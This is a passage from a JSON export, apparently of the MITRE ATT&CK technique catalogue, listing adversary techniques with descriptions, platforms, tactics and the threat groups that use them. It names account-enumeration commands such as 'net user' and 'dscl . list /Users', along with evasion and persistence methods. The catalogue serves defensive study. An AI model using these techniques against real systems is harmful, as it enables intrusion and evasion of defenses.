computer.^[[2]](https://digital-forensics.sans.org/summit-archives/2010/35-glyer-apt-persistence-mechanisms.pdf)^^[[3]](https://citizenlab.ca/2015/12/packrat-report/)^^[[4]](https://www.fireeye.com/blog/threat-research/2012/12/council-foreign-relations-water-hole-attack-details.html)^^[[5]](https://securelist.com/whos-really-spreading-through-the-bright-star/68978/)^^[[6]](https://unit42.paloaltonetworks.com/unit42-tropic-trooper-targets-taiwanese-government-and-fossil-fuel-provider-with-poison-ivy/)^\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":[]},"T1564":{"id":"T1564","name":"Hide Artifacts","description":"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.^[[1]](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)^^[[2]](https://cdn2.hubspot.net/hubfs/3354902/Content%20PDFs/Cybereason-Lab-Analysis-OSX-Pirrit-4-6-16.pdf)^^[[3]](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)^\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.^[[4]](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/)^","platforms":["Linux","macOS","Windows","Office 365"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1559.002":{"id":"T1559.002","name":"Dynamic Data Exchange","description":"Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.^[[1]](https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/)^^[[2]](https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021)^^[[3]](https://technet.microsoft.com/library/security/4053440)^\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.^[[4]](https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/)^^[[5]](https://www.contextis.com/blog/comma-separated-vulnerabilities)^^[[6]](https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee)^^[[7]](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)^ Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.^[[8]](https://owasp.org/www-community/attacks/CSV_Injection)^(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).^[[9]](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)^","platforms":["Windows"],"tactics":["Execution"],"campaigns":["Operation Sharpshooter"],"groups":["Cobalt Group","FIN7","MuddyWater","Sidewinder","APT28","APT37","Gallmaker","Leviathan","BITTER","TA505","Patchwork","Sharpshooter"]},"T1204.002":{"id":"T1204.002","name":"Malicious File","description":"An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.^[[1]](https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/)^ \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).","platforms":["Linux","macOS","Windows"],"tactics":["Execution"],"campaigns":["Operation Dust Storm","Frankenstein","Operation Spalax","C0015","C0011","Operation Dream Job","2015 Ukraine Electric Power Attack","Operation Honeybee","Operation Sharpshooter"],"groups":["APT12","Kimsuky","Machete","Elderwood","Transparent Tribe","Dragonfly","WIRTE","RTM","Aoqin Dragon","APT-C-36","CURIUM","Gallmaker","Tropic Trooper","Dark Caracal","DarkHydrus","PLATINUM","menuPass","TA551","HEXANE","FIN8","Threat Group-3390","BITTER","Ferocious Kitten","APT37","LazyScripter","PROMETHIUM","TA505","APT39","Higaisa","Rancor","Wizard Spider","OilRig","Sandworm Team","Magic Hound","FIN4","Cobalt Group","Inception","EXOTIC LILY","Ajax Security Team","Lazarus Group","FIN6","Patchwork","Whitefly","TA459","FIN7","Nomadic Octopus","APT28","Gorgon Group","APT19","TA2541","Earth Lusca","SideCopy","Mofang","Leviathan","Tonto Team","APT30","Andariel","BRONZE BUTLER","APT38","MuddyWater","Naikon","Mustang Panda","Molerats","admin@338","Gamaredon Group","Darkhotel","APT32","The White Company","IndigoZebra","APT33","Silence","Ember Bear","Sidewinder","Indrik Spider","APT29","Confucius","BlackTech","Windshift","Sharpshooter","Frankenstein","Dragonfly 2.0"]},"T1591.003":{"id":"T1591.003","name":"Identify Business Tempo","description":"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).^[[1]](https://threatpost.com/broadvoice-leaks-350m-records-voicemail-transcripts/160158/)^ Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1592.001":{"id":"T1592.001","name":"Hardware","description":"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.^[[1]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^ Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1080":{"id":"T1080","name":"Taint Shared Content","description":"\nAdversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.\n\nA directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. ^[[1]](https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html)^\n\nAdversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.","platforms":["Windows","Office 365","SaaS","Linux","macOS"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["Darkhotel","Gamaredon Group","BRONZE BUTLER"]},"T1484.002":{"id":"T1484.002","name":"Domain Trust Modification","description":"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources.^[[1]](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)^ These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert a domain to a federated domain, which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.^[[2]](https://o365blog.com/post/federation-vulnerability/)^ ","platforms":["Windows","Azure AD"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":["SolarWinds Compromise"],"groups":["UNC2452","APT29"]},"T1573.001":{"id":"T1573.001","name":"Symmetric Cryptography","description":"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.","platforms":["Linux","Windows","macOS"],"tactics":["Command and Control"],"campaigns":["Operation Dream Job","Frankenstein"],"groups":["Mustang Panda","Darkhotel","Lazarus Group","ZIRCONIUM","Volt Typhoon","Stealth Falcon","MuddyWater","Higaisa","Inception","APT33","APT28","BRONZE BUTLER","Frankenstein"]},"T1087.001":{"id":"T1087.001","name":"Local Account","description":"Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as `net user` and `net localgroup` of the [Net](https://attack.mitre.org/software/S0039) utility and `id` and `groups`on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the `/etc/passwd` file. On macOS the `dscl . list /Users` command can be used to enumerate local accounts.","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":["Operation CuckooBees"],"groups":["Ke3chang","Moses Staff","OilRig","APT32","Chimera","Turla","Fox Kitten","APT3","Threat Group-3390","Poseidon Group","admin@338","APT1"]},"T1586.001":{"id":"T1586.001","name":"Social Media Accounts","description":"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e. [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona. \n\nA variety of methods exist for compromising social media accounts, such as gathering credentials via [Phishing for Information](https://attack.mitre.org/techniques/T1598), purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).^[[1]](https://arstechnica.com/tech-policy/2011/02/anonymous-speaks-the-inside-story-of-the-hbgary-hack/)^ Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.\n\nPersonas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.\n\nAdversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.^[[2]](https://www.securityweek.com/iranian-hackers-targeted-us-officials-elaborate-social-media-attack-operation)^^[[3]](http://media.blackhat.com/bh-us-10/whitepapers/Ryan/BlackHat-USA-2010-Ryan-Getting-In-Bed-With-Robin-Sage-v1.0.pdf)^ Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Leviathan"]},"T1562.009":{"id":"T1562.009","name":"Safe Mode Boot","description":"Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.^[[1]](https://support.microsoft.com/en-us/windows/start-your-pc-in-safe-mode-in-windows-10-92c27cff-db89-8644-1ce4-b3e5e56fe234)^^[[2]](https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/)^\n\nAdversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot. Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings.^[[3]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/bcdedit)^\n\nAdversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects may also be registered and loaded in safe mode.^[[2]](https://news.sophos.com/en-us/2019/12/09/snatch-ransomware-reboots-pcs-into-safe-mode-to-bypass-protection/)^^[[4]](https://www.cyberark.com/resources/blog/cyberark-labs-from-safe-mode-to-domain-compromise)^^[[5]](https://www.cybereason.com/blog/medusalocker-ransomware)^^[[6]](https://www.bleepingcomputer.com/news/security/revil-ransomware-has-a-new-windows-safe-mode-encryption-mode/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1542.005":{"id":"T1542.005","name":"TFTP Boot","description":"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.\n\nAdversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. ^[[1]](https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954)^","platforms":["Network"],"tactics":["Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1543.003":{"id":"T1543.003","name":"Windows Service","description":"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.^[[1]](https://technet.microsoft.com/en-us/library/cc772408.aspx)^ Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.^[[2]](https://www.wired.com/images_blogs/threatlevel/2010/11/w32_stuxnet_dossier.pdf)^^[[3]](https://www.crowdstrike.com/blog/how-crowdstrike-falcon-protects-against-wiper-malware-used-in-ukraine-attacks/)^^[[4]](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)^ Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).^[[5]](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf)^^[[4]](https://unit42.paloaltonetworks.com/acidbox-rare-malware/)^\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component).","platforms":["Windows"],"tactics":["Persistence","Privilege Escalation"],"campaigns":["Operation CuckooBees","2016 Ukraine Electric Power Attack","Operation Honeybee"],"groups":["Tropic Trooper","DarkVishnya","APT38","APT41","Wizard Spider","Blue Mockingbird","TeamTNT","APT19","Threat Group-3390","Ke3chang","PROMETHIUM","APT32","Carbanak","APT3","FIN7","Kimsuky","Earth Lusca","Cobalt Group","Lazarus Group","Honeybee"]},"T1568.001":{"id":"T1568.001","name":"Fast Flux DNS","description":"Adversaries may use Fast Flux DNS to hide a command and control channel behind an array of rapidly changing IP addresses linked to a single domain resolution. This technique uses a fully qualified domain name, with multiple IP addresses assigned to it which are swapped with high frequency, using a combination of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource record.^[[1]](https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-1/#gref)^^[[2]](https://resources.infosecinstitute.com/fast-flux-networks-working-detection-part-2/#gref)^^[[3]](https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/)^\n\nThe simplest, \"single-flux\" method, involves registering and de-registering an addresses as part of the DNS A (address) record list for a single DNS name. These registrations have a five-minute average lifespan, resulting in a constant shuffle of IP address resolution.^[[3]](https://www.welivesecurity.com/2017/01/12/fast-flux-networks-work/)^\n\nIn contrast, the \"double-flux\" method registers and de-registers an address as part of the DNS Name Server record list for the DNS zone, providing additional resilience for the connection. With double-flux additional hosts can act as a proxy to the C2 host, further insulating the true source of the C2 channel.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["menuPass","TA505","Machete"]},"T1497.001":{"id":"T1497.001","name":"System Checks","description":"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.^[[1]](https://drive.google.com/file/d/1t0jn3xr4ff2fR30oQAUn_RsWSnMpOAQc)^\n\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \n\nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \n\nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.^[[2]](https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/stopping-malware-fake-virtual-machine/)^ In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \n \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.^[[3]](https://researchcenter.paloaltonetworks.com/2018/09/unit42-oilrig-targets-middle-eastern-government-adds-evasion-techniques-oopsie/)^","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Discovery"],"campaigns":["Operation Dream Job","Frankenstein"],"groups":["Evilnum","Volt Typhoon","Darkhotel","OilRig","Lazarus Group","Frankenstein"]},"T1053.003":{"id":"T1053.003","name":"Cron","description":"Adversaries may abuse the `cron` utility to perform task scheduling for initial or recurring execution of malicious code.^[[1]](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)^ The `cron` utility is a time-based job scheduler for Unix-like operating systems.  The ` crontab` file contains the schedule of cron entries to be run and the specified times for execution. Any `crontab` files are stored in operating system-specific file paths.\n\nAn adversary may use `cron` in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). ","platforms":["Linux","macOS"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":[],"groups":["Rocke","APT38"]},"T1069.002":{"id":"T1069.002","name":"Domain Groups","description":"Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as `net group /domain` of the [Net](https://attack.mitre.org/software/S0039) utility,  `dscacheutil -q group` on macOS, and `ldapsearch` on Linux can list domain-level groups.","platforms":["Linux","macOS","Windows"],"tactics":["Discovery"],"campaigns":["SolarWinds Compromise","C0015"],"groups":["LAPSUS$","Volt Typhoon","OilRig","FIN7","Ke3chang","Turla","Inception","Dragonfly","APT29","Dragonfly 2.0","Wizard Spider","FIN6"]},"T1588.006":{"id":"T1588.006","name":"Vulnerabilities","description":"Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.^[[1]](https://nvd.nist.gov/)^\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Sandworm Team"]},"T1566.002":{"id":"T1566.002","name":"Spearphishing Link","description":"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\n\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\").^[[1]](https://us-cert.cisa.gov/ncas/tips/ST05-016)^ URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an “@” symbol: for example, `hxxp://google.com@1157586937`.^[[2]](https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse)^\n\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.^[[3]](https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks)^ These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. ^[[4]](https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/)^","platforms":["Linux","macOS","Windows","Office 365","SaaS","Google Workspace"],"tactics":["Initial Access"],"campaigns":["Night Dragon","Operation Spalax","C0011","C0021","Operation Dust Storm","Operation Dream Job"],"groups":["BlackTech","MuddyWater","LuminousMoth","Confucius","Mofang","Kimsuky","Sidewinder","Elderwood","Machete","FIN7","Sandworm Team","Transparent Tribe","Evilnum","Mustang Panda","FIN8","APT32","APT3","APT1","Lazarus Group","Leviathan","APT33","ZIRCONIUM","EXOTIC LILY","Molerats","Magic Hound","OilRig","Windshift","Cobalt Group","APT29","FIN4","TA2541","APT28","Earth Lusca","Ember Bear","Turla","Wizard Spider","Patchwork","TA505","LazyScripter","APT39","Stolen Pencil","Night Dragon","Dragonfly 2.0"]},"T1070.002":{"id":"T1070.002","name":"Clear Linux or Mac System Logs","description":"Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the `/var/log/` directory. Subfolders in this directory categorize logs by their related functions, such as:^[[1]](https://www.eurovps.com/blog/important-linux-log-files-you-must-be-monitoring/)^\n\n* `/var/log/messages:`: General and system-related messages\n* `/var/log/secure` or `/var/log/auth.log`: Authentication logs\n* `/var/log/utmp` or `/var/log/wtmp`: Login records\n* `/var/log/kern.log`: Kernel logs\n* `/var/log/cron.log`: Crond logs\n* `/var/log/maillog`: Mail server logs\n* `/var/log/httpd/`: Web server access and error logs\n","platforms":["Linux","macOS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["TeamTNT","Rocke"]},"T1499.004":{"id":"T1499.004","name":"Application or System Exploitation","description":"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. ^[[1]](https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html)^ Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ","platforms":["Windows","Azure AD","Office 365","SaaS","IaaS","Linux","macOS","Google Workspace"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1137":{"id":"T1137","name":"Office Application Startup","description":"Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.\n\nA variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.^[[1]](https://github.com/sensepost/ruler)^ These persistence mechanisms can work within Outlook or be used through Office 365.^[[2]](https://blogs.technet.microsoft.com/office365security/defending-against-rules-and-forms-injection/)^","platforms":["Windows","Office 365"],"tactics":["Persistence"],"campaigns":[],"groups":["APT32","Gamaredon Group"]},"T1218.004":{"id":"T1218.004","name":"InstallUtil","description":"Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. ^[[1]](https://msdn.microsoft.com/en-us/library/50614e95.aspx)^ The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories 